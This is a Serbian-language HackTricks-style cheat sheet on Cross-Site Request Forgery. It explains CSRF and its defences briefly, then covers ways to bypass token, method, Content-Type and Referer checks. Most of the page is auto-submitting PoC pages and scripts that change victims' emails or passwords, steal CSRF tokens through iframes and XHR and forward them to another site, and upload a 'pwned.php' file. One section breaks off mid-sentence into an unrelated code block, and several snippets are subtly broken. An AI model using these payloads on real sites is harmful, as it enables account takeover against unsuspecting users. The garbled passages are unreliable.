# CSRF (Cross Site Request Forgery)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Pridružite se [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serveru kako biste komunicirali sa iskusnim hakerima i lovcima na bagove!

**Hacking Insights**\
Uključite se u sadržaj koji istražuje uzbuđenje i izazove hakovanja

**Vesti o hakovanju u realnom vremenu**\
Budite u toku sa brzim svetom hakovanja putem vesti i saznanja u realnom vremenu

**Najnovije objave**\
Ostanite informisani o najnovijim pokretanjima nagrada za pronalaženje bagova i važnim ažuriranjima platforme

**Pridružite nam se na** [**Discord-u**](https://discord.com/invite/N3FrSbmwdy) i počnite da sarađujete sa vrhunskim hakerima danas!


## CSRF (Cross-Site Request Forgery) objašnjenje

**Cross-Site Request Forgery (CSRF)** je vrsta sigurnosne ranjivosti koja se nalazi u veb aplikacijama. Omogućava napadačima da izvrše radnje u ime nesumnjivih korisnika iskorišćavanjem njihovih autentifikovanih sesija. Napad se izvršava kada korisnik, koji je prijavljen na platformu žrtve, poseti zlonamernu stranicu. Ova stranica zatim pokreće zahteve ka nalogu žrtve putem metoda kao što su izvršavanje JavaScript-a, slanje formi ili dohvatanje slika.

### Preduslovi za CSRF napad
Da bi se iskoristila CSRF ranjivost, moraju se ispuniti nekoliko uslova:

1. **Identifikacija vredne radnje**: Napadač mora pronaći radnju koju vredi iskoristiti, kao što je promena korisničke lozinke, e-pošte ili povećanje privilegija.
2. **Upravljanje sesijom**: Korisnička sesija treba da se upravlja isključivo putem kolačića ili zaglavlja HTTP Basic Authentication, jer se druga zaglavlja ne mogu manipulisati u tu svrhu.
3. **Odsustvo nepredvidivih parametara**: Zahtev ne sme da sadrži nepredvidive parametre, jer oni mogu sprečiti napad.

### Odbrana od CSRF napada
Mogu se primeniti nekoliko protivmera kako bi se zaštitili od CSRF napada:

* [**SameSite kolačići**](hacking-with-cookies/#samesite): Ova atribut sprečava pregledač da šalje kolačiće zajedno sa zahtevima sa drugih sajtova. [Više o SameSite kolačićima](hacking-with-cookies/#samesite).
* [**Cross-origin resource sharing**](cors-bypass.md): CORS politika žrtvinskog sajta može uticati na izvodljivost napada, posebno ako napad zahteva čitanje odgovora sa žrtvinskog sajta. [Saznajte više o zaobilaženju CORS-a](cors-bypass.md).
* **Provera korisnika**: Zahtevanje korisničke lozinke ili rešavanje captcha testa može potvrditi nameru korisnika.
* **Provera Referrer ili Origin zaglavlja**: Validacija ovih zaglavlja može pomoći u osiguravanju da zahtevi dolaze sa pouzdanih izvora. Međutim, pažljivo kreiranje URL-ova može zaobići loše implementirane provere, kao što su:
- Korišćenje `http://mal.net?orig=http://example.com` (URL se završava sa pouzdanim URL-om)
- Korišćenje `http://example.com.mal.net` (URL počinje sa pouzdanim URL-om)
* **Izmena imena parametara**: Izmena imena parametara u POST ili GET zahtevima može pomoći u sprečavanju automatizovanih napada.
* **CSRF tokeni**: Uključivanje jedinstvenog CSRF tokena u svaku sesiju i zahtevanje ovog tokena u kasnijim zahtevima može značajno umanjiti rizik od CSRF napada. Efikasnost tokena se može poboljšati primenom CORS-a.

Razumevanje i primena ovih odbrana je ključno za održavanje sigurnosti i integriteta veb aplikacija.

## Zaobilaženje odbrana

### Od POST do GET

Možda je obrazac koji želite da zloupotrebite pripremljen za slanje **POST zahteva sa CSRF tokenom**, ali trebali biste **proveriti** da li je i **GET** zahtev **validan** i da li se prilikom slanja GET zahteva **CSRF token i dalje validira**.

### Nedostatak tokena

Aplikacije mogu implementirati mehanizam za **validaciju tokena** kada su prisutni. Međutim, ranjivost se javlja ako se validacija potpuno preskoči kada token nije prisutan. Napadači mogu iskoristiti ovo tako što će **ukloniti parametar** koji nosi token, ne samo njegovu vrednost. To im omogućava da zaobiđu proces validacije i uspešno izvrše CSRF napad.

### CSRF token nije vezan za korisničku sesiju

Aplikacije koje **ne vežu CSRF tokene za korisničke sesije** predstavljaju značajan **sigurnosni rizik**. Ovi sistemi proveravaju tokene protiv **globalnog skupa** umesto da osiguravaju da je svaki token vezan za inicijalnu sesiju.

Evo kako napadači iskorišćavaju ovo:

1. **Autentifikacija** koristeći sopstveni nalog.
2. **Dobijanje validnog CSRF tokena** iz globalnog skupa.
3. **Korišćenje ovog tokena** u CSRF napadu protiv žrtve.

Ova ranjivost omogućava napadačima da izvrše neovlaštene zahteve u ime žrtve, iskorišćavajući neadekvatan mehanizam validacije tokena aplikacije.

### Zaobilaženje metoda

Ako zahtev koristi "**čudnu**" **metodu**, proverite da li funkcionalnost **zamene metoda** radi.
Na primer, ako se koristi **PUT** metoda, možete pokušati da koristite **POST** metodu i **pošaljete**: _https://example.com/my/dear/api/val/num?**\_method=PUT**_

Ovo takođe može raditi slanjem **\_method parametra unutar POST zahteva** ili korišćenjem **zaglavlja**:

* _X-HTTP-Method_
* _X-HTTP-Method-Override_
* _X-Method-Override_

### Zaobilaženje prilagođenog zaglavlja tokena

Ako zahtev dodaje **prilagođeno zaglavlje** sa **tokenom** kao **metodom zaštite od CSRF-a**, tada:

* Testirajte zahtev bez **pril
```html
<html>
<!-- CSRF Proof of Concept - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://example.com/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
<input type="submit" value="Submit request" />
</form>
<img src="https://example.com/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
</body>
</html>

```
{% hint style="info" %}
Imajte na umu da ako je **CSRF token povezan sa sesijskim kolačićem, ovaj napad neće uspeti** jer će vam biti potrebno da žrtvi postavite svoju sesiju, a time ćete napadati sebe.
{% endhint %}

### Promena Content-Type-a

Prema [**ovome**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests), kako biste **izbegli preflight** zahteve koristeći **POST** metodu, ovo su dozvoljene vrednosti Content-Type-a:

* **`application/x-www-form-urlencoded`**
* **`multipart/form-data`**
* **`text/plain`**

Međutim, imajte na umu da **logika servera može varirati** u zavisnosti od korišćenog Content-Type-a, pa biste trebali isprobati navedene vrednosti i druge poput **`application/json`**_**,**_**`text/xml`**, **`application/xml`**_._

Primer (preuzet [ovde](https://brycec.me/posts/corctf\_2021\_challenges)) slanja JSON podataka kao text/plain:
```html
<html>
<body>
<form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
<input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
</form>
<script>
form.submit();
</script>
</body>
</html>
```
### Zaobilazak preflight zahteva za JSON podatke

Kada pokušavate da pošaljete JSON podatke putem POST zahteva, direktno korišćenje `Content-Type: application/json` u HTML formi nije moguće. Slično, korišćenje `XMLHttpRequest` za slanje ovog tipa sadržaja pokreće preflight zahtev. Ipak, postoje strategije koje potencijalno omogućavaju zaobilaženje ove ograničenosti i proveru da li server obrađuje JSON podatke bez obzira na Content-Type:

1. **Korišćenje alternativnih Content-Type-ova**: Koristite `Content-Type: text/plain` ili `Content-Type: application/x-www-form-urlencoded` tako što ćete postaviti `enctype="text/plain"` u formi. Ovaj pristup testira da li backend koristi podatke bez obzira na Content-Type.

2. **Izmena Content Type-a**: Da biste izbegli preflight zahtev, a istovremeno obezbedili da server prepozna sadržaj kao JSON, možete poslati podatke sa `Content-Type: text/plain; application/json`. Ovo ne pokreće preflight zahtev, ali server može pravilno obraditi podatke ako je konfigurisan da prihvata `application/json`.

3. **Korišćenje SWF Flash fajla**: Manje uobičajena, ali izvodljiva metoda uključuje korišćenje SWF Flash fajla za zaobilaženje ovih ograničenja. Za detaljnije razumevanje ove tehnike, pogledajte [ovaj post](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937).

### Zaobilaženje provere Referrer / Origin

**Izbegavanje Referrer zaglavlja**

Aplikacije mogu validirati 'Referer' zaglavlje samo kada je prisutno. Da biste sprečili pregledač da pošalje ovo zaglavlje, možete koristiti sledeći HTML meta tag:
```xml
<meta name="referrer" content="never">
```
Ovo osigurava da se zaglavlje 'Referer' izostavi, potencijalno zaobilazeći provjere valjanosti u nekim aplikacijama.

**Bypass Regexp**

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

Da biste postavili ime domene servera u URL-u koji će Referrer poslati unutar parametara, možete uraditi:
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
<head><meta name="referrer" content="unsafe-url"></head>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
document.forms[0].submit();
</script>
</body>
</html>
```
### **Bypass metoda HEAD**

Prvi deo [**ovog CTF writeup-a**](https://github.com/google/google-ctf/tree/master/2023/web-vegsoda/solution) objašnjava da [izvorni kod Oak-a](https://github.com/oakserver/oak/blob/main/router.ts#L281), rutera je postavljen da **obradi HEAD zahteve kao GET zahteve** bez tela odgovora - uobičajeni način rada koji nije jedinstven za Oak. Umesto posebnog rukovaoca koji se bavi HEAD zahtevima, oni jednostavno **bivaju prosleđeni GET rukovaocu, ali aplikacija samo uklanja telo odgovora**.

Dakle, ako je GET zahtev ograničen, možete jednostavno **poslati HEAD zahtev koji će biti obrađen kao GET zahtev**.

## **Primeri eksploatacije**

### **Izvlačenje CSRF tokena**

Ako se koristi **CSRF token** kao **odbrana**, možete pokušati da ga **izvučete** zloupotrebom [**XSS**](xss-cross-site-scripting/#xss-stealing-csrf-tokens) ranjivosti ili ranjivosti [**Dangling Markup**](dangling-markup-html-scriptless-injection/).

### **GET korišćenjem HTML tagova**
```xml
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
Drugi HTML5 tagovi koji se mogu koristiti za automatsko slanje GET zahteva su:
```html
<iframe src="..."></iframe>
<script src="..."></script>
<img src="..." alt="">
<embed src="...">
<audio src="...">
<video src="...">
<source src="..." type="...">
<video poster="...">
<link rel="stylesheet" href="...">
<object data="...">
<body background="...">
<div style="background: url('...');"></div>
<style>
body { background: url('...'); }
</style>
<bgsound src="...">
<track src="..." kind="subtitles">
<input type="image" src="..." alt="Submit Button">
```
### GET zahtev preko forme

Kada se koristi HTML forma za slanje podataka na server, obično se koristi metoda GET ili POST. GET metoda se koristi za slanje podataka preko URL-a, dok se POST metoda koristi za slanje podataka u telu HTTP zahteva.

CSRF napad može iskoristiti GET zahtev preko forme tako što će napadač kreirati lažnu formu koja će izgledati kao legitimna forma na ciljanoj veb stranici. Kada žrtva popuni formu i pošalje je, podaci će biti poslati na server, ali će takođe biti izvršen i CSRF napad.

Da bi se izvršio CSRF napad preko GET zahteva, napadač će kreirati URL koji sadrži parametre sa vrednostima koje želi da pošalje na server. Ovaj URL će biti smešten u lažnu formu koja će biti automatski poslata kada žrtva poseti ciljanu veb stranicu.

Da bi se zaštitili od CSRF napada preko GET zahteva, preporučuje se korišćenje POST metode za slanje podataka preko forme. Takođe, implementacija CSRF tokena može dodatno otežati napadačima da izvrše ovu vrstu napada.
```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### Form POST zahtev

Form POST zahtev je HTTP zahtev koji se koristi za slanje podataka sa klijenta na server putem HTML forme. Ovaj zahtev se koristi za slanje podataka kao što su korisničko ime i lozinka prilikom prijavljivanja na veb stranicu.

Da biste izvršili CSRF napad putem form POST zahteva, napadač će kreirati lažnu veb stranicu koja sadrži formu sa ciljanim ciljem. Kada žrtva poseti ovu lažnu stranicu i popuni formu, podaci će biti automatski poslati na ciljni server. Ovaj napad se obično izvodi korišćenjem skripti na strani napadača, kao što je JavaScript.

Da biste se zaštitili od CSRF napada putem form POST zahteva, možete koristiti različite metode, kao što su:

- Korišćenje CSRF tokena: Dodavanje jedinstvenog tokena u formu koji se generiše prilikom svakog zahteva. Ovaj token se zatim proverava na serveru kako bi se osiguralo da je zahtev legitimno poslat od strane korisnika.
- Provera referera: Provera HTTP referera kako bi se osiguralo da je zahtev poslat sa iste veb stranice sa koje je korisnik prijavljen.
- Korišćenje SameSite atributa: Postavljanje SameSite atributa na "Strict" ili "Lax" kako bi se ograničilo slanje kolačića sa zahtevima sa drugih domena.

Implementacija ovih mera zaštite može pomoći u sprečavanju CSRF napada putem form POST zahteva i očuvanju sigurnosti vaše veb aplikacije.
```html
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form method="POST" action="https://victim.net/email/change-email" id="csrfform">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit(); //Way 3 to autosubmit
</script>
</body>
</html>
```
### Form POST zahtev putem iframe-a

Kada želite da izvršite CSRF napad putem iframe-a, možete koristiti sledeći metod:

1. Kreirajte HTML stranicu koja sadrži `<form>` element sa odgovarajućim atributima, kao što su `action` (ciljni URL) i `method` (POST).
2. Postavite vrednosti polja forme na željene vrednosti, uključujući i CSRF token ako je potreban.
3. Ubacite `<iframe>` element u HTML stranicu i postavite `src` atribut na ciljni URL.
4. Koristite CSS da sakrijete iframe tako da korisnik ne primeti njegovo prisustvo.

Kada žrtva poseti HTML stranicu, form POST zahtev će biti automatski izvršen putem iframe-a, bez da korisnik primeti. Ovo omogućava napadaču da izvrši zlonamerne radnje u ime žrtve, kao što je slanje lažnih zahteva ili izvršavanje akcija koje zahtevaju autentifikaciju.

Važno je napomenuti da ovaj metod može biti blokiran od strane modernih pregledača zbog sigurnosnih razloga. Takođe, ciljni sajt može preduzeti mere zaštite protiv CSRF napada, kao što je korišćenje CSRF tokena ili provera referera.
```html
<!--
The request is sent through the iframe withuot reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### **Ajax POST zahtev**

Ajax POST zahtev je tehnika koja se koristi za slanje HTTP POST zahteva asinhrono, bez potrebe za osvežavanjem celokupne stranice. Ova tehnika se često koristi u veb aplikacijama radi slanja podataka na server i ažuriranja sadržaja stranice bez prekida korisničkog iskustva.

Da biste izvršili CSRF napad putem Ajax POST zahteva, napadač bi trebao da ubaci zlonamerni kod u legitimnu veb stranicu koju korisnik posećuje. Kada korisnik poseti tu stranicu, zlonamerni kod će automatski izvršiti POST zahtev na drugu veb stranicu, koristeći autentičnost korisnika na prvoj stranici. Ovo može dovesti do neovlašćenog izvršavanja akcija na drugoj stranici, kao što je promena lozinke ili brisanje podataka.

Da biste se zaštitili od CSRF napada putem Ajax POST zahteva, preporučuje se korišćenje CSRF tokena. CSRF token je jedinstveni identifikator koji se generiše za svaku sesiju i ugrađuje u svaki POST zahtev. Server zatim proverava da li se token podudara sa tokenom koji je generisan za tu sesiju, čime se osigurava da je zahtev legitimno poslat od strane korisnika.

Ukoliko veb aplikacija ne koristi CSRF token, napadač može iskoristiti ovu ranjivost za izvršavanje zlonamernih radnji na računu korisnika. Stoga je važno da programeri implementiraju odgovarajuće mere zaštite kako bi sprečili CSRF napade putem Ajax POST zahteva.
```html
<script>
var xh;
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
xh=new XMLHttpRequest();
}
else
{// code for IE6, IE5
xh=new ActiveXObject("Microsoft.XMLHTTP");
}
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2"
})
</script>
```
### multipart/form-data POST zahtev

Multipart/form-data POST zahtev se koristi za slanje podataka preko HTTP protokola. Ovaj tip zahteva se često koristi za slanje datoteka ili formulara koji sadrže različite vrste podataka.

Da biste napravili multipart/form-data POST zahtev, morate koristiti odgovarajući Content-Type zaglavlje i formatirati telo zahteva u skladu sa specifikacijom.

Evo primera kako izgleda multipart/form-data POST zahtev:

```http
POST /upload HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=---------------------------1234567890

-----------------------------1234567890
Content-Disposition: form-data; name="file"; filename="example.txt"
Content-Type: text/plain

Ovo je primer datoteke.

-----------------------------1234567890
Content-Disposition: form-data; name="name"

John Doe
-----------------------------1234567890--
```

U ovom primeru, zaglavlje Content-Type specificira da je format podataka multipart/form-data, a boundary parametar definiše razgraničivač između različitih delova podataka.

Svaki deo podataka je definisan sa Content-Disposition zaglavljem, koje specificira da li je deo datoteka ili polje forme. Takođe, može sadržati dodatne informacije kao što su ime polja ili ime datoteke.

Nakon zaglavlja, sledi telo podataka koje je odvojeno od ostatka zahteva razgraničivačem. Svaki deo podataka je odvojen sa razgraničivačem i može sadržati različite vrste podataka.

Kada se multipart/form-data POST zahtev pošalje na server, server može obraditi podatke u skladu sa specifikacijom i izvršiti odgovarajuće akcije, kao što je čuvanje datoteke ili obrada formulara.
```javascript
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: {"Content-Type": "application/x-www-form-urlencoded"},
mode: "no-cors"
});
```
### multipart/form-data POST zahtev v2

Multipart/form-data POST zahtev se koristi za slanje podataka preko HTTP protokola. Ovaj tip zahteva se često koristi za slanje datoteka ili formulara koji sadrže različite vrste podataka.

Da biste izvršili CSRF napad na multipart/form-data POST zahtev, potrebno je da žrtva bude prijavljena na ciljnu veb aplikaciju. Napadač može da konstruiše zlonamerni HTML kod koji će automatski izvršiti zahtev kada žrtva poseti zlonamernu veb stranicu.

Da biste izvršili CSRF napad, napadač mora da konstruiše HTML formular koji će sadržati ciljni multipart/form-data POST zahtev. Formular će biti automatski podnet kada žrtva poseti zlonamernu veb stranicu.

Napadač može da koristi sledeće metode za izvršavanje CSRF napada na multipart/form-data POST zahtev:

1. Skriveni iframe: Napadač može da koristi skriveni iframe da bi automatski izvršio multipart/form-data POST zahtev kada žrtva poseti zlonamernu veb stranicu. Ovo se postiže postavljanjem ciljnog zahteva kao ciljne veb stranice u iframe elementu.

2. JavaScript: Napadač može da koristi JavaScript kod da bi automatski izvršio multipart/form-data POST zahtev kada žrtva poseti zlonamernu veb stranicu. Ovo se postiže korišćenjem XMLHttpRequest objekta ili Fetch API-ja za slanje zahteva.

Da biste se zaštitili od CSRF napada na multipart/form-data POST zahtev, preporučuje se korišćenje CSRF tokena. CSRF token je jedinstveni identifikator koji se generiše za svaku sesiju i ugrađuje se u multipart/form-data POST zahtev. Prilikom obrade zahteva, veb aplikacija proverava da li se CSRF token podudara sa očekivanim vrednostima. Ako se token ne podudara, zahtev se odbacuje.

Takođe je važno da veb aplikacija implementira odgovarajuće sigurnosne mehanizme kako bi sprečila izvršavanje zlonamernih zahteva. Ovo može uključivati proveru referera, proveru korisničkih prava i implementaciju sigurnosnih politika za zaštitu od CSRF napada.
```javascript
// https://www.exploit-db.com/exploits/20009
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
```
### Form POST zahtev iz okvira (iframe)

Kada se radi o napadima CSRF (Cross-Site Request Forgery), jedna od tehnika koja se može koristiti je slanje form POST zahteva iz okvira (iframe). Ova tehnika omogućava napadaču da izvrši neovlašćene radnje u ime žrtve.

Da bi se izvršio ovaj napad, napadač će prvo kreirati HTML stranicu koja sadrži formu sa ciljanim akcijama. Zatim će tu stranicu ugraditi u iframe na svojoj zlonamernoj veb stranici. Kada žrtva poseti zlonamernu stranicu, form POST zahtev će biti automatski poslat sa podacima koje je napadač unapred postavio.

Ova tehnika je posebno opasna jer se zahtevi šalju sa legitimnim kredencijalima žrtve, što može dovesti do izvršavanja neovlašćenih radnji u ime žrtve, kao što su promena lozinke, brisanje podataka ili izvršavanje finansijskih transakcija.

Da bi se zaštitili od ovog napada, veb aplikacije treba da primene odgovarajuće mere zaštite, kao što su korišćenje CSRF tokena, provera referera ili implementacija dvofaktorne autentifikacije.
```html
<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```
### **Ukradi CSRF token i pošalji POST zahtev**

Da biste izvršili CSRF napad, prvo morate da ukradete CSRF token sa ciljane veb stranice. Ovaj token se obično nalazi u HTML formi ili u zaglavlju zahteva. Nakon što ste dobili token, možete ga koristiti da biste poslali lažni POST zahtev na ciljanu veb stranicu.

Evo koraka za izvršavanje ovog napada:

1. Prikupite CSRF token sa ciljane veb stranice. Možete to uraditi pregledanjem izvornog koda stranice ili korišćenjem alata za ispitivanje saobraćaja poput Burp Suite.

2. Napravite lažni POST zahtev koristeći ukradeni CSRF token. Ovaj zahtev može sadržati bilo kakve podatke koje želite da pošaljete na ciljanu veb stranicu.

3. Pošaljite lažni POST zahtev na ciljanu veb stranicu. Možete koristiti alate poput cURL ili Postman za slanje zahteva.

4. Ako je napad uspešan, ciljana veb stranica će obraditi lažni zahtev kao da je legitimni zahtev poslat od strane autentičnog korisnika.

Napomena: CSRF napadi su neetički i ilegalni, osim ako se izvode u okviru zakonitog ispitivanja ranjivosti ili sa dozvolom vlasnika ciljane veb stranice. Uvek se pridržavajte zakona i etičkih smernica prilikom izvođenja bilo kakvih hakovanja ili ispitivanja ranjivosti.
```javascript
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest();
xhr.open("POST", POST_URL, true);
xhr.withCredentials = true;

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

// This is for debugging and can be removed
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
var xhr = new XMLHttpRequest();
// This tels it to return it as a HTML document
xhr.responseType = "document";
xhr.withCredentials = true;
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true);
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token");
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value);
}
};
// Make the request
xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```
### **Ukradi CSRF token i pošalji POST zahtev koristeći iframe, formu i Ajax**

Da biste izvršili CSRF napad, prvo morate da ukradete CSRF token sa ciljane veb stranice. Postoje tri metode koje možete koristiti za to: iframe, forma i Ajax.

#### **Iframe metoda**

1. Kreirajte iframe element u HTML kodu koji će prikazivati ciljanu veb stranicu.
2. Koristite JavaScript da pristupite CSRF tokenu unutar iframe-a.
3. Pošaljite POST zahtev koristeći ukradeni CSRF token.

#### **Forma metoda**

1. Kreirajte HTML formu koja će simulirati akciju na ciljanoj veb stranici.
2. Uključite CSRF token u formu.
3. Automatski podnesite formu koristeći JavaScript.

#### **Ajax metoda**

1. Koristite JavaScript da izvršite Ajax zahtev na ciljanoj veb stranici.
2. Uključite CSRF token u zahtev.
3. Pošaljite POST zahtev koristeći ukradeni CSRF token.

Napomena: Ove metode su ilegalne i koriste se samo u edukativne svrhe ili sa pristankom vlasnika veb stranice.
```html
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
x1=document.getElementById("i1");
x1d=(x1.contentWindow||x1.contentDocument);
t=x1d.document.getElementById("token").value;

document.getElementById("token").value=t;
document.getElementById("form1").submit();
}
</script>
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```
### **Ukradi CSRF token i pošalji POST zahtev koristeći iframe i formu**

Da biste izvršili CSRF napad, prvo morate da ukradete CSRF token sa ciljane veb stranice. Jedan od načina da to uradite je korišćenjem iframe-a i forme.

1. Napravite iframe koji će učitati ciljanu veb stranicu:

```html
<iframe id="targetFrame" src="https://www.ciljanavebstranica.com"></iframe>
```

2. Koristite JavaScript da biste pristupili iframe-u i izvukli CSRF token:

```html
<script>
  var targetFrame = document.getElementById('targetFrame');
  var csrfToken = targetFrame.contentWindow.document.querySelector('input[name="csrf_token"]').value;
</script>
```

3. Kreirajte formu koja će sadržati ukradeni CSRF token i ciljane podatke za POST zahtev:

```html
<form id="csrfForm" action="https://www.ciljanavebstranica.com/post" method="POST">
  <input type="hidden" name="csrf_token" value="">
  <input type="hidden" name="data" value="ciljanipodaci">
</form>
```

4. Koristite JavaScript da biste postavili ukradeni CSRF token u formu i automatski je podneli:

```html
<script>
  var csrfForm = document.getElementById('csrfForm');
  csrfForm.querySelector('input[name="csrf_token"]').value = csrfToken;
  csrfForm.submit();
</script>
```

Kada žrtva poseti veb stranicu koja sadrži ovaj kod, iframe će učitati ciljanu veb stranicu i izvući CSRF token. Zatim će se automatski popuniti forma sa ukradenim tokenom i ciljanim podacima, i podneti POST zahtev na ciljanu veb stranicu. Na taj način, napadač može izvršiti zlonamerne radnje u ime žrtve.
```html
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script>
function read()
{
var name = 'admin2';
var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
document.writeln('</form>');
document.forms[0].submit.click();
}
</script>
```
### **Ukradi token i pošalji ga koristeći 2 iframe-a**

Da biste izvršili CSRF napad, prvo morate ukrasti CSRF token sa ciljane veb stranice. Zatim, koristite dva iframe-a da biste poslali ukradeni token na drugu veb stranicu.

1. Napravite prvi iframe koji će prikazivati ciljanu veb stranicu. Ovaj iframe će automatski učitati ciljanu veb stranicu i dobiti CSRF token.

```html
<iframe src="https://www.ciljanavebstranica.com" id="iframe1"></iframe>
```

2. Koristite JavaScript da biste pristupili CSRF tokenu u prvom iframe-u i sačuvali ga u promenljivoj.

```html
<script>
  var iframe1 = document.getElementById('iframe1');
  var token = iframe1.contentWindow.document.getElementsByName('csrf_token')[0].value;
</script>
```

3. Napravite drugi iframe koji će poslati ukradeni token na drugu veb stranicu.

```html
<iframe src="https://www.drugavebstranica.com/csrf-attack" id="iframe2"></iframe>
```

4. Koristite JavaScript da biste postavili ukradeni token u drugom iframe-u.

```html
<script>
  var iframe2 = document.getElementById('iframe2');
  iframe2.contentWindow.document.getElementsByName('csrf_token')[0].value = token;
  iframe2.contentWindow.document.forms[0].submit();
</script>
```

